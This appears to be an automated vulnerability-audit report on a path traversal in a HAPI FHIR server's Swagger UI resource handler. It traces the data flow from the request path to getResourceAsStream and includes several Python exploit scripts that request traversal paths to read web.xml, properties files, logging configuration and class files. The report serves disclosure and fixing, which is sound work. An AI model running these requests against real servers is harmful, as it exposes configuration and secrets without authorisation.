findings.description: Path traversal via user-controlled HTTP path in OpenApiInterceptor - classpath resource disclosure
findings.code_snippet:
String resourcePath = requestPath.substring("/swagger-ui/".length());
		try (InputStream resource = ClasspathUtil.loadResourceAsStream("/META-INF/resources/webjars/swagger-ui/" + mySwaggerUiVersion + "/" + resourcePath)) {
findings.reasoning:
The method `handleResourceRequest` receives `requestPath` directly from `theRequest.getPathInfo()` (line 181). The only validation is `requestPath.startsWith("/swagger-ui/")` at line 204, which is string-based and does NOT prevent path traversal sequences. A request path like `/swagger-ui/../WEB-INF/web.xml` passes the `startsWith` check.

At line 246, the prefix `/swagger-ui/` is stripped via `substring`, leaving `../WEB-INF/web.xml`. This is then concatenated with `/META-INF/resources/webjars/swagger-ui/{version}/` and passed to `ClasspathUtil.loadResourceAsStream()`.

`ClasspathUtil.loadResourceAsStream()` uses `Class.getResourceAsStream()` which resolves relative path components (`../`). This allows an attacker to traverse out of the `/META-INF/resources/webjars/swagger-ui/{version}/` directory and access any resource on the classpath — including `WEB-INF/web.xml`, application config files, `.properties` files, `.class` files, etc.

There is no path canonicalization, no `../` stripping, and no containment check before the resource is loaded. The `endsWith(".js")/.endsWith(".map")/.endsWith(".css")` content-type checks at lines 249/257 only affect content-type headers and are NOT security controls — they don't prevent the resource from being loaded.

Key bypass: `/swagger-ui/../WEB-INF/web.xml` → `startsWith("/swagger-ui/")` passes → `resourcePath = "../WEB-INF/web.xml"` → loads `/META-INF/resources/webjars/swagger-ui/{ver}/../../../WEB-INF/web.xml` (resolved to `/WEB-INF/web.xml` on classpath).

evidence.dataflow_analysis: HTTP request getPathInfo() -> requestPath -> substring() to extract resourcePath -> string concatenation with classpath prefix -> ClasspathUtil.loadResourceAsStream() -> getResourceAsStream(). No sanitization in the chain.
evidence.notes: The content-type checks at lines 249/257 (.js, .map, .css) only assign a content-type header to the response, they are NOT security guards. The resource is always loaded at line 247 before any content-type check. An attacker can request a .js-suffixed path that traverses: /swagger-ui/../../../WEB-INF/web.js would load the resource and serve it as application/javascript.

exploit_payload.code_snippet:
# Exploit: Path traversal via OpenAPI Swagger UI endpoint
# Target: HAPI FHIR server with OpenApiInterceptor enabled

import requests

base_url = "http://target-server:8080/fhir"

# Attack 1: Access WEB-INF/web.xml (sensitive config)
# Path: /swagger-ui/../WEB-INF/web.xml
# startsWith('/swagger-ui/') check: PASSES
# resourcePath after substring: '../WEB-INF/web.xml'
# Final classpath: /META-INF/resources/webjars/swagger-ui/{ver}/../WEB-INF/web.xml
# Resolves to: /WEB-INF/web.xml
response = requests.get(base_url + "/swagger-ui/../WEB-INF/web.xml")
print("WEB-INF/web.xml:", response.text)

# Attack 2: Access application.properties
response = requests.get(base_url + "/swagger-ui/../../META-INF/spring.factories")
print("spring.factories:", response.text)

# Attack 3: Bypass content-type check by appending .js extension workaround
# /swagger-ui/../WEB-INF/web.xml%00.js (null byte if applicable)
# Or simply - file type check happens AFTER loading, so response body is still read
response = requests.get(base_url + "/swagger-ui/../ca/uhn/fhir/context/FhirContext.class")
print("Class file bytes:", response.content[:100])
exploit_payload.scenario: Unauthenticated attacker sends HTTP GET request to /swagger-ui/../WEB-INF/web.xml, bypassing the startsWith('/swagger-ui/') check, to read arbitrary classpath resources including WEB-INF configuration files, application secrets, and class files
exploit_payload.prerequisites: Server must have OpenApiInterceptor registered (it is a commonly used HAPI FHIR feature). No authentication required.

findings.description: Path traversal sink in ClasspathUtil.loadResourceAsStream - getResourceAsStream called with user-controlled path (line 69)
findings.reasoning: This is the primary sink where user-controlled input from `OpenApiInterceptor.handleResourceRequest` flows into `getResourceAsStream()`. The path originates from `theRequest.getPathInfo()` (line 181 of OpenApiInterceptor), passes the weak `startsWith("/swagger-ui/")` check, has the prefix stripped, and is then concatenated with `/META-INF/resources/webjars/swagger-ui/{version}/` before being passed to `ClasspathUtil.loadResourceAsStream()`. No normalization or traversal-sequence stripping occurs before this call. `Class.getResourceAsStream()` resolves `../` sequences, enabling access to any classpath resource.

evidence.code_context:
ClasspathUtil.loadResourceAsStream(String theClasspath):
  Line 63: String classpath = theClasspath;
  Line 65: if (classpath.startsWith('classpath:')) { classpath = classpath.substring('classpath:'.length()); }
  Line 69: InputStream retVal = ClasspathUtil.class.getResourceAsStream(classpath); // SINK - user-controlled path

Caller in OpenApiInterceptor line 247:
  ClasspathUtil.loadResourceAsStream('/META-INF/resources/webjars/swagger-ui/' + mySwaggerUiVersion + '/' + resourcePath)
  where resourcePath = requestPath.substring('/swagger-ui/'.length())
  and requestPath comes from theRequest.getPathInfo() with only startsWith check
evidence.dataflow_analysis: HTTP getPathInfo() -> requestPath -> substring() -> resourcePath -> string concat -> loadResourceAsStream argument -> getResourceAsStream(classpath) at line 69
evidence.notes: All three getResourceAsStream calls (lines 69, 72, 74) are in the same method and represent the same tainted data reaching the filesystem. Line 69 is the primary attempt; lines 72 and 74 are fallback paths tried if the first returns null.

exploit_payload.code_snippet:
# Same exploit as OpenApiInterceptor finding - this is the sink reached
# GET /fhir/swagger-ui/../WEB-INF/web.xml
# Tainted classpath value at this line: '/META-INF/resources/webjars/swagger-ui/4.x.x/../WEB-INF/web.xml'
# getResourceAsStream resolves ../ -> loads /WEB-INF/web.xml from classpath
import requests
resp = requests.get('http://target:8080/fhir/swagger-ui/../WEB-INF/web.xml')
print(resp.text)  # Outputs WEB-INF/web.xml contents
exploit_payload.scenario: Attacker sends traversal path through OpenApiInterceptor which flows unsanitized to getResourceAsStream at this line, disclosing classpath resources
exploit_payload.prerequisites: OpenApiInterceptor must be registered on the HAPI FHIR server

findings.description: Path traversal sink in ClasspathUtil.loadResourceAsStream - fallback getResourceAsStream with leading-slash stripped path (line 72)
findings.reasoning: This is the first fallback sink in `loadResourceAsStream`. If line 69's `getResourceAsStream(classpath)` returns null, and the classpath starts with `/`, it tries again with the leading slash stripped (e.g., `classpath.substring(1)`). The user-controlled traversal path — originating from `theRequest.getPathInfo()` in OpenApiInterceptor — flows into this branch as well. Since the path like `/META-INF/resources/webjars/swagger-ui/{ver}/../WEB-INF/web.xml` starts with `/`, if the primary call fails, this fallback is reached with `META-INF/resources/webjars/swagger-ui/{ver}/../WEB-INF/web.xml`. `getResourceAsStream` still resolves `../` sequences, so the traversal still works in this branch.

evidence.dataflow_analysis: Same tainted path from OpenApiInterceptor flows here as fallback when line 69 returns null
evidence.notes: This is the second attempt with leading slash stripped - still vulnerable to ../traversal sequences

exploit_payload.code_snippet:
# Same exploit - fallback branch reached when primary getResourceAsStream returns null
# classpath = '/META-INF/resources/webjars/swagger-ui/4.x/../WEB-INF/web.xml'
# After substring(1): 'META-INF/resources/webjars/swagger-ui/4.x/../WEB-INF/web.xml'
# getResourceAsStream still resolves ../
import requests
resp = requests.get('http://target:8080/fhir/swagger-ui/../WEB-INF/web.xml')
print(resp.text)
exploit_payload.scenario: Fallback branch in ClasspathUtil.loadResourceAsStream reached with traversal path, disclosing classpath resources
exploit_payload.prerequisites: OpenApiInterceptor must be registered on the HAPI FHIR server

findings.description: Path traversal sink in ClasspathUtil.loadResourceAsStream - second fallback getResourceAsStream with leading slash added (line 74)
findings.reasoning: This is the second fallback sink in `loadResourceAsStream`. If line 69 returns null and the classpath does NOT start with `/`, it prepends a `/` and tries again. In the case where the classpath is a relative traversal path without a leading slash, this fallback is reached. The user-controlled traversal path — originating from `theRequest.getPathInfo()` in OpenApiInterceptor — can also flow into this branch. `getResourceAsStream` still resolves `../` sequences. All three getResourceAsStream calls (69, 72, 74) in this method are reachable with tainted input from the same source and represent the same root-cause vulnerability.

evidence.dataflow_analysis: Same tainted path from OpenApiInterceptor flows here as second fallback when classpath doesn't start with /
evidence.notes: Third attempt in the same method - prepends / to a classpath without leading slash. Still vulnerable to traversal.

exploit_payload.code_snippet:
# Same exploit - second fallback branch reached when classpath has no leading slash
# classpath = 'META-INF/resources/webjars/swagger-ui/4.x/../WEB-INF/web.xml'
# getResourceAsStream('/' + classpath) = getResourceAsStream('/META-INF/.../web.xml')
import requests
resp = requests.get('http://target:8080/fhir/swagger-ui/../WEB-INF/web.xml')
print(resp.text)
exploit_payload.scenario: Second fallback branch in ClasspathUtil.loadResourceAsStream reached with traversal path, disclosing classpath resources
exploit_payload.prerequisites: OpenApiInterceptor must be registered on the HAPI FHIR server

findings.description: HTTP path input from getPathInfo() flows unsanitized to classpath resource loading - root source of path traversal
findings.reasoning: This is the HTTP input source for the path traversal vulnerability. `theRequest.getPathInfo()` returns the raw path info from the HTTP request, which is fully attacker-controlled. The only validation applied is `requestPath.startsWith("/swagger-ui/")` at line 204 - this is a string-based prefix check that is trivially bypassed with paths like `/swagger-ui/../WEB-INF/web.xml` or `/swagger-ui/../ca/uhn/fhir/context/FhirContext.class`. The tainted `requestPath` is passed directly to `handleResourceRequest()` without any canonicalization, normalization, or traversal-sequence stripping. From there, the prefix is stripped and the user-controlled suffix is concatenated into a classpath resource path and loaded via `ClasspathUtil.loadResourceAsStream()` / `Class.getResourceAsStream()`. There is no path normalization anywhere in this chain - no `Path.normalize()`, no `File.getCanonicalPath()`, no `../` stripping.

evidence.code_context:
Line 179: @Hook(Pointcut.SERVER_INCOMING_REQUEST_PRE_HANDLER_SELECTED)
Line 180: public boolean serveSwaggerUi(HttpServletRequest theRequest, ...) throws IOException {
Line 181:   String requestPath = theRequest.getPathInfo(); // USER-CONTROLLED SOURCE
Line 182:   String queryString = theRequest.getQueryString();
Line 204:   if (requestPath.startsWith('/swagger-ui/')) { // WEAK CHECK - bypassable
Line 206:     return !handleResourceRequest(theResponse, theRequestDetails, requestPath); // tainted path passed
Line 246:   String resourcePath = requestPath.substring('/swagger-ui/'.length()); // strips prefix
Line 247:   ClasspathUtil.loadResourceAsStream('/META-INF/resources/webjars/swagger-ui/' + ver + '/' + resourcePath) // SINK
evidence.dataflow_analysis: Complete chain: HTTP getPathInfo() [line 181] -> startsWith check [line 204] (bypassable) -> handleResourceRequest [line 206] -> substring [line 246] -> string concat -> loadResourceAsStream [line 247] -> getResourceAsStream [ClasspathUtil line 69/72/74]
evidence.notes: No normalization found anywhere in the call chain. The @Hook annotation means this is called for every incoming request, making it universally accessible with no authentication required.

exploit_payload.code_snippet:
# Complete exploit demonstrating the full attack chain
import requests

base_url = 'http://target-server:8080/fhir'

# Step 1: Bypass startsWith('/swagger-ui/') with traversal
# requestPath = '/swagger-ui/../WEB-INF/web.xml'
# startsWith('/swagger-ui/') -> TRUE (bypassed)
# resourcePath = requestPath.substring(12) = '../WEB-INF/web.xml'
# classpath = '/META-INF/resources/webjars/swagger-ui/{ver}/../WEB-INF/web.xml'
# Resolves to: /WEB-INF/web.xml

# Access WEB-INF/web.xml
resp = requests.get(base_url + '/swagger-ui/../WEB-INF/web.xml')
print('[+] WEB-INF/web.xml:', resp.status_code)
print(resp.text[:500])

# Access application properties (Spring Boot)
resp = requests.get(base_url + '/swagger-ui/../application.properties')
print('[+] application.properties:', resp.status_code)
print(resp.text[:500])

# Access log4j config for additional info disclosure
resp = requests.get(base_url + '/swagger-ui/../log4j2.xml')
print('[+] log4j2.xml:', resp.status_code)
print(resp.text[:500])

# Access .class files - reveals source code structure
resp = requests.get(base_url + '/swagger-ui/../ca/uhn/fhir/rest/openapi/OpenApiInterceptor.class')
print('[+] OpenApiInterceptor.class bytes:', len(resp.content))
exploit_payload.scenario: Unauthenticated attacker sends GET /fhir/swagger-ui/../WEB-INF/web.xml to bypass the startsWith check and read arbitrary classpath resources including configuration files, application secrets, and compiled class files
exploit_payload.prerequisites: Server must have OpenApiInterceptor registered (default in HAPI FHIR OpenAPI module). No authentication required as the @Hook intercepts all incoming requests before handler selection.
exploit_payload.category: Classpath path traversal / arbitrary resource disclosure
